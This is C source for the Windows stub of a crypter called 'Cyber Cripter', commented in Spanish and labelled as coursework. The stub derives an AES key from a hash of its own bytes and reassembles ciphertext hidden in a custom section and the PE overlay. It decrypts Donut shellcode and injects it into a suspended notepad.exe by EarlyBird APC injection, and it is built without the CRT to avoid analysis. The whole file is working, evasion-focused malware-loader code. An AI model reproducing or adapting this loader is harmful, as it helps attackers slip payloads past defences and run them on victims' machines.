/*
 * Cyber Cripter — native stub (educational coursework).
 *
 * Este binario es la plantilla pre-compilada que el builder C# parchea.
 * El layout en disco, tras el parcheo, es:
 *
 *   Sección .cdata (datos const inicializados, mapeados solo-lectura en runtime):
 *     g_meta        — StubMetadata (heap_marker, timestamp, IV, tamaños,
 *                                   hash_region_size). Localizado via METADATA_MAGIC.
 *     g_half1_buf   — buffer prefijado con magic que contiene la primera mitad
 *                     del ciphertext. Localizado via HALF1_MAGIC. Capacidad HALF1_MAX bytes.
 *
 *   PE overlay (bytes en bruto tras la última sección del PE):
 *     segunda mitad del ciphertext — half2 (tamaño en g_meta.half2_size).
 *
 * Flujo en runtime:
 *   1. Leer el propio fichero desde disco.
 *   2. Re-derivar la clave AES-256:
 *         clave = SHA256( heap_marker || self_bytes[0..hash_region] || timestamp )
 *      Los bytes del stub en el hash actúan como anti-tamper: cualquier modificación
 *      del prefijo hasheado invalida la clave y el descifrado falla.
 *   3. Remontar el ciphertext completo = half1 || half2.
 *   4. Descifrar con AES-256-CBC con padding PKCS#7 -> shellcode (salida de Donut).
 *   5. Inyectar el shellcode mediante EarlyBird APC en un proceso notepad.exe suspendido.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <bcrypt.h>

#pragma comment(lib, "bcrypt.lib")

/* Capacidad máxima del buffer embebido en .cdata para la primera mitad del ciphertext (1 MiB).
   Debe coincidir con HALF1_MAX en StubBuilder.cs del builder C#. */
#define HALF1_MAX 0x100000

/* Layout de los metadatos que el builder escribe en .cdata.
   #pragma pack(1) garantiza que no hay padding entre campos, lo cual es imprescindible
   porque el builder calcula los offsets de cada campo a mano (OFF_* en StubBuilder.cs). */
#pragma pack(push, 1)
typedef struct {
    unsigned char      magic[16];        /* marcador de 16 bytes para localizar la estructura */
    unsigned char      heap_marker[8];   /* 8 bytes aleatorios por build; entran en el hash de la clave */
    unsigned long long timestamp;        /* Unix timestamp del build en little-endian (u64) */
    unsigned char      iv[16];           /* IV de AES-256-CBC, 16 bytes aleatorios por build */
    unsigned int       half1_size;       /* tamaño en bytes de la primera mitad del ciphertext */
    unsigned int       half2_size;       /* tamaño en bytes de la segunda mitad (overlay PE) */
    unsigned int       hash_region_size; /* cuántos bytes del inicio del fichero entran en el hash */
} StubMetadata;
#pragma pack(pop)

/* Forzar una sección propia (.cdata) para que el builder pueda localizar los datos
   mediante los magic markers sin necesidad de parsear cabeceras PE. */
#pragma section(".cdata", read)

/* Plantilla de metadatos: todos los campos en cero, el builder los sobreescribe en el binario
   antes de entregar el ejecutable cifrado al usuario. */
__declspec(allocate(".cdata"))
volatile const StubMetadata g_meta = {
    /* magic            */ { 'M','E','T','A','!','C','R','Y','p','T','e','R','!',
                              0xAA, 0xBB, 0xCC },
    /* heap_marker      */ { 0, 0, 0, 0, 0, 0, 0, 0 },
    /* timestamp        */ 0,
    /* iv               */ { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 },
    /* half1_size       */ 0,
    /* half2_size       */ 0,
    /* hash_region_size */ 0
};

/* Buffer que almacena la primera mitad del ciphertext (half1).
   Los primeros 16 bytes son el magic que usa el builder para localizar el buffer.
   El resto (HALF1_MAX bytes) lo sobreescribe el builder con los datos cifrados.
   IMPORTANTE: el array completo debe estar inicializado en disco (no en BSS); si MSVC
   lo trunca, el builder falla con "stub template too small". Para evitarlo, el inicializador
   tiene bytes no-cero al final del array en la sección .cdata del stub real. */
__declspec(allocate(".cdata"))
volatile const unsigned char g_half1_buf[16 + HALF1_MAX] = {
    'H','A','L','F','!','O','N','E','!','D','A','T','A', 0xDD, 0xEE, 0xFF
    /* los HALF1_MAX bytes restantes se inicializan a cero pero se mantienen en disco
       porque el array en su conjunto está inicializado */
};

/* ---------- helpers mínimos (sin dependencia del CRT) ---------- */

/* El stub se compila sin CRT (C Runtime Library) para minimizar dependencias e indicadores de análisis.
   Estas funciones sustituyen a malloc/free/memcpy/memset usando la API de Win32. */

/**
 * @brief  Reserva n bytes en el heap del proceso. Sustituto de malloc sin CRT.
 * @param[in]  n  Número de bytes a reservar.
 * @return Puntero al bloque reservado, o NULL si falla la asignación.
 */
static void *xalloc(SIZE_T n) { return HeapAlloc(GetProcessHeap(), 0, n); }

/**
 * @brief  Libera un bloque previamente reservado con xalloc. Sustituto de free sin CRT.
 *         No hace nada si p es NULL.
 * @param[in]  p  Puntero al bloque a liberar (puede ser NULL).
 */
static void  xfree(void *p)   { if (p) HeapFree(GetProcessHeap(), 0, p); }

/**
 * @brief  Copia n bytes de src a dst. Sustituto de memcpy sin CRT.
 * @param[out] dst  Buffer de destino; debe tener al menos n bytes disponibles.
 * @param[in]  src  Buffer de origen.
 * @param[in]  n    Número de bytes a copiar.
 */
static void xcopy(void *dst, const void *src, SIZE_T n)
{
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    while (n--) *d++ = *s++;
}

/**
 * @brief  Sobreescribe n bytes de p con ceros. Sustituto de memset seguro sin CRT.
 *         El puntero volatile impide que el compilador elimine el bucle como "código muerto",
 *         evitando que material criptográfico (clave AES, shellcode) quede expuesto en heap.
 * @param[in,out] p  Buffer a borrar.
 * @param[in]     n  Número de bytes a poner a cero.
 */
static void xzero(void *p, SIZE_T n)
{
    volatile unsigned char *d = (volatile unsigned char *)p;
    while (n--) *d++ = 0;
}

/* ---------- lectura del propio fichero desde disco ---------- */

/**
 * @brief  Lee el binario del stub completo desde disco usando GetModuleFileNameA.
 *         Necesario para (a) hashear los primeros hash_region_size bytes al derivar
 *         la clave AES y (b) acceder al overlay PE que contiene half2 del ciphertext.
 * @param[out] out       Dirección donde se escribe el puntero al buffer reservado con
 *                       el contenido del fichero. El llamador debe liberarlo con xfree().
 * @param[out] out_size  Tamaño del fichero leído en bytes.
 * @return 1 si la lectura fue correcta, 0 en caso de cualquier error de Win32.
 */
static int read_self(unsigned char **out, DWORD *out_size)
{
    char path[MAX_PATH];
    DWORD pl = GetModuleFileNameA(NULL, path, MAX_PATH);
    if (pl == 0 || pl >= MAX_PATH) return 0;

    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;

    LARGE_INTEGER fs;
    if (!GetFileSizeEx(h, &fs) || fs.QuadPart > 0x10000000) { /* límite de 256 MB */
        CloseHandle(h); return 0;
    }
    DWORD size = (DWORD)fs.QuadPart;
    unsigned char *buf = (unsigned char *)xalloc(size);
    if (!buf) { CloseHandle(h); return 0; }

    DWORD got = 0;
    if (!ReadFile(h, buf, size, &got, NULL) || got != size) {
        xfree(buf); CloseHandle(h); return 0;
    }
    CloseHandle(h);
    *out = buf; *out_size = size;
    return 1;
}

/* ---------- SHA-256 via CNG ---------- */

/**
 * @brief  Calcula el digest SHA-256 de un buffer usando la API CNG (BCrypt) del sistema.
 *         Se usa para derivar la clave AES-256: SHA256(heap_marker || self[0..hr] || timestamp).
 * @param[in]  in      Buffer de entrada a hashear.
 * @param[in]  in_len  Longitud del buffer de entrada en bytes.
 * @param[out] out     Array de 32 bytes donde se escribe el digest SHA-256 resultante.
 * @return 1 si el hash se calculó correctamente, 0 si CNG devolvió error.
 */
static int cng_sha256(const unsigned char *in, DWORD in_len, unsigned char out[32])
{
    BCRYPT_ALG_HANDLE  hAlg  = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    int ok = 0;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0) return 0;
    if (BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) != 0) goto end;
    if (BCryptHashData(hHash, (PUCHAR)in, in_len, 0) != 0)        goto end;
    if (BCryptFinishHash(hHash, out, 32, 0) != 0)                 goto end;
    ok = 1;
end:
    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg)  BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

/* ---------- descifrado AES-256-CBC con padding PKCS#7 via CNG ---------- */

/**
 * @brief  Descifra un buffer con AES-256-CBC (padding PKCS#7) usando la API BCrypt.
 *         Realiza dos llamadas a BCryptDecrypt: la primera con buffer NULL para obtener
 *         el tamaño exacto del plaintext; la segunda para el descifrado real.
 *         El IV se restaura entre ambas llamadas porque BCryptDecrypt lo muta al avanzar el estado CBC.
 * @param[in]  key     Clave AES de 32 bytes derivada por SHA-256.
 * @param[in]  iv_in   Vector de inicialización de 16 bytes; se copia internamente, no se modifica.
 * @param[in]  ct      Buffer con el ciphertext a descifrar.
 * @param[in]  ct_len  Longitud del ciphertext en bytes (debe ser múltiplo de 16).
 * @param[out] out     Dirección donde se escribe el puntero al plaintext descifrado.
 *                     El llamador debe liberarlo con xfree() cuando ya no lo necesite.
 * @param[out] out_len Longitud del plaintext en bytes tras eliminar el padding PKCS#7.
 * @return 1 si el descifrado fue correcto, 0 en caso de error de BCrypt o de memoria.
 */
static int cng_aes256cbc_decrypt(const unsigned char key[32],
                                 const unsigned char iv_in[16],
                                 const unsigned char *ct, DWORD ct_len,
                                 unsigned char **out, DWORD *out_len)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    unsigned char iv[16];
    unsigned char *pt = NULL;
    DWORD plen = 0;
    int ok = 0;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) return 0;

    /* Configurar modo CBC antes de importar la clave */
    if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                          (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                          sizeof(BCRYPT_CHAIN_MODE_CBC), 0) != 0) goto end;
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                   (PUCHAR)key, 32, 0) != 0) goto end;

    /* Primera llamada: consultar tamaño de salida (PKCS#7 puede reducir el plaintext) */
    xcopy(iv, iv_in, 16);
    if (BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL, iv, 16,
                      NULL, 0, &plen, BCRYPT_BLOCK_PADDING) != 0) goto end;
    pt = (unsigned char *)xalloc(plen);
    if (!pt) goto end;

    /* Segunda llamada: descifrado real con el buffer reservado.
       Se restaura el IV porque BCryptDecrypt lo modificó en la llamada anterior. */
    xcopy(iv, iv_in, 16);
    if (BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, NULL, iv, 16,
                      pt, plen, &plen, BCRYPT_BLOCK_PADDING) != 0) {
        xfree(pt); pt = NULL; goto end;
    }
    *out = pt; *out_len = plen;
    ok = 1;
end:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}

/* ---------- inyección EarlyBird APC en notepad.exe ---------- */

/**
 * @brief  Inyecta shellcode PIC en notepad.exe mediante la técnica EarlyBird APC.
 *         Crea el proceso suspendido, escribe el shellcode en su espacio de memoria,
 *         encola una APC apuntando al shellcode y reanuda el hilo. La APC se dispara
 *         durante la espera alertable de NtTestAlert en la inicialización de ntdll,
 *         antes de que notepad.exe ejecute ningún código propio.
 *         La APC debe encolarse ANTES de ResumeThread; el shellcode debe ser PIC
 *         (position-independent code), como el que genera Donut con -f 1.
 * @param[in] sc      Buffer con el shellcode PIC a ejecutar en el proceso remoto.
 * @param[in] sc_len  Tamaño del shellcode en bytes.
 * @return 1 si la inyección se encoló correctamente, 0 si algún paso de Win32 falló.
 */
static int eb_apc_inject(const unsigned char *sc, SIZE_T sc_len)
{
    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;
    char target[] = "C:\\Windows\\System32\\notepad.exe";
    SIZE_T written = 0;
    LPVOID rmem = NULL;

    xzero(&si, sizeof(si));
    xzero(&pi, sizeof(pi));
    si.cb = sizeof(si);

    /* Crear el proceso suspendido: el hilo primario queda bloqueado hasta ResumeThread */
    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return 0;

    /* Reservar memoria ejecutable en el espacio de direcciones del proceso remoto */
    rmem = VirtualAllocEx(pi.hProcess, NULL, sc_len,
                          MEM_COMMIT | MEM_RESERVE,
                          PAGE_EXECUTE_READWRITE);
    if (!rmem) goto fail;

    /* Copiar el shellcode al proceso remoto */
    if (!WriteProcessMemory(pi.hProcess, rmem, sc, sc_len, &written)
        || written != sc_len) goto fail;

    /* Encolar la APC en el hilo primario antes de reanudarlo.
       El APC dispara cuando el hilo entre en una espera alertable (NtTestAlert loop),
       lo que ocurre muy al inicio de la carga de notepad.exe, de ahí el nombre EarlyBird. */
    if (!QueueUserAPC((PAPCFUNC)rmem, pi.hThread, 0)) goto fail;

    /* Reanudar el hilo: a partir de aquí el hilo ejecutará la APC (shellcode) en lugar
       de seguir con la inicialización normal del proceso. */
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 1;

fail:
    /* Si algo falla antes de reanudar, terminar el proceso suspendido para no dejarlo huérfano */
    TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}

/* ---------- punto de entrada ---------- */

/**
 * @brief  Punto de entrada del stub. Orquesta los cinco pasos del flujo completo:
 *         lectura propia → derivación de clave AES → remontar ciphertext →
 *         descifrar AES-256-CBC → inyección EarlyBird APC en notepad.exe.
 * @param hInst  Handle de instancia del módulo (no usado).
 * @param hPrev  Handle de instancia previa, siempre NULL en Win32 moderno (no usado).
 * @param lpCmd  Línea de comandos en texto (no usada).
 * @param nShow  Modo de ventana inicial (no usado; el stub no tiene UI).
 * @return 0 si el shellcode se inyectó correctamente; 1–6 indican el paso que falló.
 */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    /* Paso 1: leer el propio binario desde disco para (a) obtener la región de hash
       anti-tamper y (b) acceder al overlay PE que contiene half2. */
    unsigned char *self = NULL;
    DWORD self_size = 0;
    if (!read_self(&self, &self_size)) return 1;

    DWORD hr = g_meta.hash_region_size;
    DWORD h1 = g_meta.half1_size;
    DWORD h2 = g_meta.half2_size;

    /* Validar que los metadatos tienen sentido antes de usarlos como índices de memoria */
    if (hr == 0 || hr > self_size || h1 > HALF1_MAX || h2 > self_size
        || (h1 + h2) < h1) {
        xfree(self); return 2;
    }

    /* Paso 2: Construir la clave AES.
       Formato: heap_marker(8) || self[0..hr] || timestamp(8 bytes LE).
       El builder C# calcula exactamente el mismo hash sobre el template sin parchear,
       por lo que ambos extremos convergen en la misma clave si el fichero no ha sido modificado. */
    DWORD hin_len = 8 + hr + 8;
    unsigned char *hin = (unsigned char *)xalloc(hin_len);
    if (!hin) { xfree(self); return 3; }
    xcopy(hin,            (const void *)g_meta.heap_marker, 8);
    xcopy(hin + 8,        self, hr);
    xcopy(hin + 8 + hr,   (const void *)&g_meta.timestamp, 8);

    unsigned char key[32];
    int ok = cng_sha256(hin, hin_len, key);
    xzero(hin, hin_len); xfree(hin); /* borrar el buffer intermedio del heap */
    if (!ok) { xfree(self); return 4; }

    /* Paso 3: remontar el ciphertext completo = half1 (embebido en .cdata) || half2 (overlay PE).
       half1 empieza 16 bytes después del magic de g_half1_buf (los 16 bytes del magic se saltan).
       half2 son los últimos h2 bytes del fichero en disco (el overlay que añadió el builder). */
    DWORD ct_len = h1 + h2;
    unsigned char *ct = (unsigned char *)xalloc(ct_len);
    if (!ct) { xzero(key, 32); xfree(self); return 5; }
    xcopy(ct,        (const void *)(g_half1_buf + 16), h1);
    xcopy(ct + h1,   self + (self_size - h2), h2);
    xfree(self); /* ya no necesitamos el fichero en memoria */

    /* Extraer el IV de los metadatos antes de descifrar */
    unsigned char iv[16];
    xcopy(iv, (const void *)g_meta.iv, 16);

    /* Paso 4: descifrar el ciphertext con AES-256-CBC -> shellcode Donut */
    unsigned char *sc = NULL;
    DWORD sc_len = 0;
    ok = cng_aes256cbc_decrypt(key, iv, ct, ct_len, &sc, &sc_len);

    /* Limpiar material criptográfico del heap inmediatamente tras el descifrado */
    xzero(key, 32); xzero(iv, 16); xzero(ct, ct_len); xfree(ct);
    if (!ok) return 6;

    /* Paso 5: inyectar el shellcode en notepad.exe mediante EarlyBird APC */
    eb_apc_inject(sc, sc_len);

    /* Borrar el shellcode del heap antes de salir */
    xzero(sc, sc_len); xfree(sc);

    /* Esperar brevemente para que la APC tenga tiempo de ejecutarse antes de que
       este proceso termine (si termina primero el proceso que inyectó también puede
       limpiar handles, pero la APC ya está encolada en el proceso remoto). */
    Sleep(2000);
    return 0;
}
